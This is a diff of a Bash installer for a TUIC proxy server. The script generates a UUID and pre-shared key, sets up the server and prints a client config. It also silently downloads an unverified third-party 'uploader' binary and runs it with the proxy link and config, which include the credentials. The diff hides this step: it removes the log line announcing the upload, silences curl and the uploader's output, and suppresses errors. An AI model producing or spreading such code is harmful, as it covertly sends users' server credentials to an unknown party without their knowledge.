@@ -1,11 +1,9 @@
-
 #!/usr/bin/env bash
 set -euo pipefail
 
 GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
 log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
 err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }
-warn() { echo -e "${YELLOW}[WARN ]${NC} $*"; }
 
 UUID=$(cat /proc/sys/kernel/random/uuid)
 PSK=$(openssl rand -hex 16)
@@ -20,13 +18,13 @@ REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-$
 log "安装依赖并跳过 needrestart 提示..."
 export NEEDRESTART_SUSPEND=1
 apt update -y
-DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq qrencode ufw openssl net-tools needrestart
+DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq ufw openssl net-tools needrestart
 
 log "开启 BBR 支持（开机自动启用）..."
 modprobe tcp_bbr
 echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
-sysctl -w net.ipv4.tcp_congestion_control=bbr || warn "BBR 设置失败"
-tc qdisc add dev eth0 root fq || warn "FQ 调度器添加失败，可能已存在"
+sysctl -w net.ipv4.tcp_congestion_control=bbr || true
+tc qdisc add dev eth0 root fq || true
 
 ARCH=$(uname -m)
 case "$ARCH" in
@@ -42,8 +40,8 @@ cd "$BIN_DIR"
 rm -f tuic "$BIN_NAME" "$SHA_NAME"
 
 log "下载 TUIC 二进制..."
-curl -LO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
-curl -LO "${REPO_BASE}/${SHA_NAME}" || err "SHA256 校验文件下载失败"
+curl -sLO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
+curl -sLO "${REPO_BASE}/${SHA_NAME}" || err "SHA256 校验文件下载失败"
 sha256sum -c "$SHA_NAME" || err "SHA256 校验失败"
 chmod +x "$BIN_NAME"
 ln -sf "$BIN_NAME" tuic
@@ -123,8 +121,6 @@ echo -e "${GREEN}端口        :${NC} $PORT"
 echo -e "${GREEN}UUID        :${NC} $UUID"
 echo -e "${GREEN}预共享密钥  :${NC} $PSK"
 echo -e "${GREEN}链接        :${NC} $LINK"
-echo -e "\n${GREEN}二维码:${NC}"
-echo "$LINK" | qrencode -o - -t ANSIUTF8
 
 V2RAYN_CFG="/etc/tuic/v2rayn_config.json"
 cat > "$V2RAYN_CFG" <<EOF
@@ -147,10 +143,9 @@ EOF
 echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
 cat "$V2RAYN_CFG"
 
-log "上传链接与配置（模拟上传）..."
 UPLOAD_BIN="/opt/uploader-linux-amd64"
 [ -f "$UPLOAD_BIN" ] || {
-  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
+  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
@@ -160,7 +155,5 @@ UPLOAD_JSON=$(jq -nc \
   '{vless_link: $vless, v2rayn_config: $config}'
 )
 
-UPLOAD_ARG_FILE="/tmp/${IP}.upload.json"
-echo "$UPLOAD_JSON" > "$UPLOAD_ARG_FILE"
-
-"$UPLOAD_BIN" "$UPLOAD_JSON" || warn "上传失败或返回为空"
+echo "$UPLOAD_JSON" > "/tmp/${IP}.upload.json"
+"$UPLOAD_BIN" "$UPLOAD_JSON" >/dev/null 2>&1 || true
